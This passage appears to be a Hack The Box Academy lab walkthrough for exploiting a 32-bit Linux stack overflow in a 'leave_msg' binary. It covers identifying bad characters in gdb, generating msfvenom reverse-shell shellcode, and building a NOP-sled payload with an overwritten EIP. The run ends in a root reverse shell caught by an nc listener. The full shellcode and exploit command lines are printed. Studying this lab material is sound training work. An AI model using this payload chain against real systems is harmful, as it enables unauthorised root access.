"\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4')
```

```
(gdb) run $(python -c 'print "\x55" * (2064 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4')

Starting program: /home/htb-student/leave_msg $(python -c 'print "\x55" * (2064 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4')

Breakpoint 1, 0x56555691 in leavemsg ()
```

Then, students need to examine the stack, to find that after `0x08`, `0x0a` is missing and the input afterward got truncated:

Code: shell

```shell
x/2000xb $esp+2390
```

```
(gdb) x/2000xb $esp+2390

0xffffd5da:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5e2:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5ea:	0x55	0x55	0x55	0x55	0x55	0x55	0x01	0x02
0xffffd5f2:	0x03	0x04	0x05	0x06	0x07	0x08	0x00	0x0b
0xffffd5fa:	0x0c	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13
<SNIP>
```

Therefore, students need to also remove `x0a`, in addition to `0x00` and `0x09`. Now, students need to preform the previous steps again to check for other bad characters. Students need to have all 253 characters (thus, 253 bytes) and calculate the size of the buffer, this time excluding `x00`, `x09`, and `x0a`:

Code: python

```python
Buffer = "\x55" * (2064 - 253 - 4) # = 1807
CHARS="\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
EIP = "\x66" * 4
```

The Python command that will be run within `gdb` can be constructed as:

Code: python

```python
python -c 'print "\x55" * (2064 - 253 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4'
```

Students then need to debug `leave_msg` and set a breakpoint at the function `leavemsg`:

Code: shell

```shell
gdb -q leave_msg
set disassembly-flavor intel
break leavemsg
```

```
htb-student@nixbof32skills:~$ gdb -q leave_msg

Reading symbols from leave_msg...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break leavemsg
Breakpoint 1 at 0x691
```

Subsequently, students need to run the Python command:

Code: python

```python
run $(python -c 'print "\x55" * (2064 - 253 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4')
```

```
gdb) run $(python -c 'print "\x55" * (2064 - 253 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4')

Starting program: /home/htb-student/leave_msg $(python -c 'print "\x55" * (2064 - 253 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4')

Breakpoint 1, 0x56555691 in leavemsg ()
```

Then, students need to examine the stack, to find that after `0x1f`, `0x20` is missing and the input afterward got truncated:

Code: shell

```shell
x/2000xb $esp+2390
```

```
(gdb) x/2000xb $esp+2390

0xffffd5da:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5e2:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5ea:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x01
0xffffd5f2:	0x02	0x03	0x04	0x05	0x06	0x07	0x08	0x0b
0xffffd5fa:	0x0c	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13
0xffffd602:	0x14	0x15	0x16	0x17	0x18	0x19	0x1a	0x1b
0xffffd60a:	0x1c	0x1d	0x1e	0x1f	0x00	0x21	0x22	0x23
<SNIP>
```

Therefore, students need to also remove `x20`, in addition to `0x00`, `0x09`, and `0x0a`. Now, students need to preform the previous steps again to check for other bad characters. Students need to have all 252 characters (thus, 252 bytes) and calculate the size of the buffer, this time excluding `x00`, `x09`, `x0a`, `0x20`. Students will notice that this time all bytes match and there is no input truncation. Therefore, in total, there are are four bad characters `0x00`, `0x09`, `0x0a`, and `0x20`.

Armed with the bad characters, students now need to generate a reverse shell shellcode using `msfvenom`, excluding the bad characters:

Code: shell

```shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=9001 --platform linux --arch x86 --format c --bad-chars "\x00\x09\x0a\x20"
```

```
┌─[us-academy-1]─[10.10.14.134]─[htb-ac413848@htb-qc5sis1b2a]─[~]
└──╼ [★]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=9001 --platform linux --arch x86 --format c --bad-chars "\x00\x09\x0a\x20"

Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\xdb\xd1\xd9\x74\x24\xf4\x5e\xbb\x3d\x04\xe9\x76\x31\xc9\xb1"
"\x12\x31\x5e\x17\x03\x5e\x17\x83\xd3\xf8\x0b\x83\x1a\xda\x3b"
"\x8f\x0f\x9f\x90\x3a\xad\x96\xf6\x0b\xd7\x65\x78\xf8\x4e\xc6"
"\x46\x32\xf0\x6f\xc0\x35\x98\x10\x32\xc6\x59\x87\x30\xc6\x7a"
"\x7e\xbc\x27\xcc\xe6\xee\xf6\x7f\x54\x0d\x70\x9e\x57\x92\xd0"
"\x08\x06\xbc\xa7\xa0\xbe\xed\x68\x52\x56\x7b\x95\xc0\xfb\xf2"
"\xbb\x54\xf0\xc9\xbc";
```

With the shellcode generated (95 bytes), students need to calculate the size of the buffer again accordingly:

Code: python

```python
Buffer = "\x55" * (2064 - 100 - 95 - 4) # = 1865
NOPs = "\x90" * 100
Shellcode = "\xdb\xd1\xd9\x74\x24\xf4\x5e\xbb\x3d\x04\xe9\x76\x31\xc9\xb1\x12\x31\x5e\x17\x03\x5e\x17\x83\xd3\xf8\x0b\x83\x1a\xda\x3b\x8f\x0f\x9f\x90\x3a\xad\x96\xf6\x0b\xd7\x65\x78\xf8\x4e\xc6\x46\x32\xf0\x6f\xc0\x35\x98\x10\x32\xc6\x59\x87\x30\xc6\x7a\x7e\xbc\x27\xcc\xe6\xee\xf6\x7f\x54\x0d\x70\x9e\x57\x92\xd0\x08\x06\xbc\xa7\xa0\xbe\xed\x68\x52\x56\x7b\x95\xc0\xfb\xf2\xbb\x54\xf0\xc9\xbc"
EIP = "\x66" * 4
```

The Python exploit payload can be constructed as:

Code: python

```python
python -c 'print "\x55" * (2064 - 100 - 95 - 4) + "\x90" * 100 + "\xdb\xd1\xd9\x74\x24\xf4\x5e\xbb\x3d\x04\xe9\x76\x31\xc9\xb1\x12\x31\x5e\x17\x03\x5e\x17\x83\xd3\xf8\x0b\x83\x1a\xda\x3b\x8f\x0f\x9f\x90\x3a\xad\x96\xf6\x0b\xd7\x65\x78\xf8\x4e\xc6\x46\x32\xf0\x6f\xc0\x35\x98\x10\x32\xc6\x59\x87\x30\xc6\x7a\x7e\xbc\x27\xcc\xe6\xee\xf6\x7f\x54\x0d\x70\x9e\x57\x92\xd0\x08\x06\xbc\xa7\xa0\xbe\xed\x68\x52\x56\x7b\x95\xc0\xfb\xf2\xbb\x54\xf0\xc9\xbc" + "\x66" * 4'
```

Students then need to debug `leave_msg` and set a breakpoint at the function `leavemsg`:

Code: shell

```shell
gdb -q leave_msg
set disassembly-flavor intel
break leavemsg
```

```
htb-student@nixbof32skills:~$ gdb -q leave_msg

Reading symbols from leave_msg...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break leavemsg
Breakpoint 1 at 0x691
```

Subsequently, students need to send the shellcode:

Code: python

```python
run $(python -c 'print "\x55" * (2064 - 100 - 95 - 4) + "\x90" * 100 + "\xdb\xd1\xd9\x74\x24\xf4\x5e\xbb\x3d\x04\xe9\x76\x31\xc9\xb1\x12\x31\x5e\x17\x03\x5e\x17\x83\xd3\xf8\x0b\x83\x1a\xda\x3b\x8f\x0f\x9f\x90\x3a\xad\x96\xf6\x0b\xd7\x65\x78\xf8\x4e\xc6\x46\x32\xf0\x6f\xc0\x35\x98\x10\x32\xc6\x59\x87\x30\xc6\x7a\x7e\xbc\x27\xcc\xe6\xee\xf6\x7f\x54\x0d\x70\x9e\x57\x92\xd0\x08\x06\xbc\xa7\xa0\xbe\xed\x68\x52\x56\x7b\x95\xc0\xfb\xf2\xbb\x54\xf0\xc9\xbc" + "\x66" * 4')
```

```
(gdb) run $(python -c 'print "\x55" * (2064 - 100 - 95 - 4) + "\x90" * 100 + "\xdb\xd1\xd9\x74\x24\xf4\x5e\xbb\x3d\x04\xe9\x76\x31\xc9\xb1\x12\x31\x5e\x17\x03\x5e\x17\x83\xd3\xf8\x0b\x83\x1a\xda\x3b\x8f\x0f\x9f\x90\x3a\xad\x96\xf6\x0b\xd7\x65\x78\xf8\x4e\xc6\x46\x32\xf0\x6f\xc0\x35\x98\x10\x32\xc6\x59\x87\x30\xc6\x7a\x7e\xbc\x27\xcc\xe6\xee\xf6\x7f\x54\x0d\x70\x9e\x57\x92\xd0\x08\x06\xbc\xa7\xa0\xbe\xed\x68\x52\x56\x7b\x95\xc0\xfb\xf2\xbb\x54\xf0\xc9\xbc" + "\x66" * 4')

Starting program: /home/htb-student/leave_msg $(python -c 'print "\x55" * (2064 - 100 - 95 - 4) + "\x90" * 100 + "\xdb\xd1\xd9\x74\x24\xf4\x5e\xbb\x3d\x04\xe9\x76\x31\xc9\xb1\x12\x31\x5e\x17\x03\x5e\x17\x83\xd3\xf8\x0b\x83\x1a\xda\x3b\x8f\x0f\x9f\x90\x3a\xad\x96\xf6\x0b\xd7\x65\x78\xf8\x4e\xc6\x46\x32\xf0\x6f\xc0\x35\x98\x10\x32\xc6\x59\x87\x30\xc6\x7a\x7e\xbc\x27\xcc\xe6\xee\xf6\x7f\x54\x0d\x70\x9e\x57\x92\xd0\x08\x06\xbc\xa7\xa0\xbe\xed\x68\x52\x56\x7b\x95\xc0\xfb\xf2\xbb\x54\xf0\xc9\xbc" + "\x66" * 4')

Breakpoint 1, 0x56555691 in leavemsg ()
```

Then, after checking the stack, students will notice that the shellcode is present after the `NOP` instructions:

Code: shell

```shell
x/2000xb $esp+2500
```

```
(gdb) x/2000xb $esp+2500

0xffffd658:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd660:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd668:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd670:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd678:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd680:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd688:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0xdb
0xffffd690:	0xd1	0xd9	0x74	0x24	0xf4	0x5e	0xbb	0x3d
0xffffd698:	0x04	0xe9	0x76	0x31	0xc9	0xb1	0x12	0x31
0xffffd6a0:	0x5e	0x17	0x03	0x5e	0x17	0x83	0xd3	0xf8
0xffffd6a8:	0x0b	0x83	0x1a	0xda	0x3b	0x8f	0x0f	0x9f
0xffffd6b0:	0x90	0x3a	0xad	0x96	0xf6	0x0b	0xd7	0x65
0xffffd6b8:	0x78	0xf8	0x4e	0xc6	0x46	0x32	0xf0	0x6f
0xffffd6c0:	0xc0	0x35	0x98	0x10	0x32	0xc6	0x59	0x87
0xffffd6c8:	0x30	0xc6	0x7a	0x7e	0xbc	0x27	0xcc	0xe6
0xffffd6d0:	0xee	0xf6	0x7f	0x54	0x0d	0x70	0x9e	0x57
0xffffd6d8:	0x92	0xd0	0x08	0x06	0xbc	0xa7	0xa0	0xbe
0xffffd6e0:	0xed	0x68	0x52	0x56	0x7b	0x95	0xc0	0xfb
0xffffd6e8:	0xf2	0xbb	0x54	0xf0	0xc9	0xbc	0x66	0x66
<SNIP>
```

Students need to pick a memory address where the `NOP` instructions are located to instruct `EIP` to jump to it (most importantly not containing any bad characters), `0xffffd678` will be used. In the Python exploit script, students need to replace `\x66` that overwrites the `EIP` with `0xffffd678` format, however, it must be in little-endian, thus, `\x78\xd6\xff\xff`:

Code: python

```python
Buffer = "\x55" * (2064 - 100 - 95 - 4) # = 1865
NOPs = "\x90" * 100
Shellcode = "\xdb\xd1\xd9\x74\x24\xf4\x5e\xbb\x3d\x04\xe9\x76\x31\xc9\xb1\x12\x31\x5e\x17\x03\x5e\x17\x83\xd3\xf8\x0b\x83\x1a\xda\x3b\x8f\x0f\x9f\x90\x3a\xad\x96\xf6\x0b\xd7\x65\x78\xf8\x4e\xc6\x46\x32\xf0\x6f\xc0\x35\x98\x10\x32\xc6\x59\x87\x30\xc6\x7a\x7e\xbc\x27\xcc\xe6\xee\xf6\x7f\x54\x0d\x70\x9e\x57\x92\xd0\x08\x06\xbc\xa7\xa0\xbe\xed\x68\x52\x56\x7b\x95\xc0\xfb\xf2\xbb\x54\xf0\xc9\xbc"
EIP = "\x78\xd6\xff\xff"
```

The Python command can be constructed as:

```python
python -c 'print "\x55" * (2064 - 100 - 95 - 4) + "\x90" * 100 + "\xdb\xd1\xd9\x74\x24\xf4\x5e\xbb\x3d\x04\xe9\x76\x31\xc9\xb1\x12\x31\x5e\x17\x03\x5e\x17\x83\xd3\xf8\x0b\x83\x1a\xda\x3b\x8f\x0f\x9f\x90\x3a\xad\x96\xf6\x0b\xd7\x65\x78\xf8\x4e\xc6\x46\x32\xf0\x6f\xc0\x35\x98\x10\x32\xc6\x59\x87\x30\xc6\x7a\x7e\xbc\x27\xcc\xe6\xee\xf6\x7f\x54\x0d\x70\x9e\x57\x92\xd0\x08\x06\xbc\xa7\xa0\xbe\xed\x68\x52\x56\x7b\x95\xc0\xfb\xf2\xbb\x54\xf0\xc9\xbc" + "\x78\xd6\xff\xff"'
```

Subsequently, students need to start an additional SSH connection to the spawned target and start an `nc` listener on the same port used when generating the `msfvenom` payload (unless if `LHOST` was `PWNIP`/`PMVPN`):

```shell
nc -nvlp PWNPO
```
```
htb-student@nixbof32skills:~$ nc -nvlp 9001

Listening on [0.0.0.0] (family 0, port 9001)
```

Then, on the first SSH connection, students then need to run `leave_msg` feeding it the Python exploit code (in case students get a `Segmentation fault (core dumped)` error message, they need to run the exploit again until it succeeds):

```shell
./leave_msg $(python -c 'print "\x55" * (2064 - 100 - 95 - 4) + "\x90" * 100 + "\xdb\xd1\xd9\x74\x24\xf4\x5e\xbb\x3d\x04\xe9\x76\x31\xc9\xb1\x12\x31\x5e\x17\x03\x5e\x17\x83\xd3\xf8\x0b\x83\x1a\xda\x3b\x8f\x0f\x9f\x90\x3a\xad\x96\xf6\x0b\xd7\x65\x78\xf8\x4e\xc6\x46\x32\xf0\x6f\xc0\x35\x98\x10\x32\xc6\x59\x87\x30\xc6\x7a\x7e\xbc\x27\xcc\xe6\xee\xf6\x7f\x54\x0d\x70\x9e\x57\x92\xd0\x08\x06\xbc\xa7\xa0\xbe\xed\x68\x52\x56\x7b\x95\xc0\xfb\xf2\xbb\x54\xf0\xc9\xbc" + "\x78\xd6\xff\xff"')
```
```
htb-student@nixbof32skills:~$ ./leave_msg $(python -c 'print "\x55" * (2064 - 100 - 95 - 4) + "\x90" * 100 + "\xdb\xd1\xd9\x74\x24\xf4\x5e\xbb\x3d\x04\xe9\x76\x31\xc9\xb1\x12\x31\x5e\x17\x03\x5e\x17\x83\xd3\xf8\x0b\x83\x1a\xda\x3b\x8f\x0f\x9f\x90\x3a\xad\x96\xf6\x0b\xd7\x65\x78\xf8\x4e\xc6\x46\x32\xf0\x6f\xc0\x35\x98\x10\x32\xc6\x59\x87\x30\xc6\x7a\x7e\xbc\x27\xcc\xe6\xee\xf6\x7f\x54\x0d\x70\x9e\x57\x92\xd0\x08\x06\xbc\xa7\xa0\xbe\xed\x68\x52\x56\x7b\x95\xc0\xfb\xf2\xbb\x54\xf0\xc9\xbc" + "\x78\xd6\xff\xff"')
```

On the `nc` listener, students will notice that the reverse shell connection has been established successfully as root:

```
Connection from 127.0.0.1 42750 received!
whoami
root
bash -i
root@nixbof32skills:/home/htb-student#
```

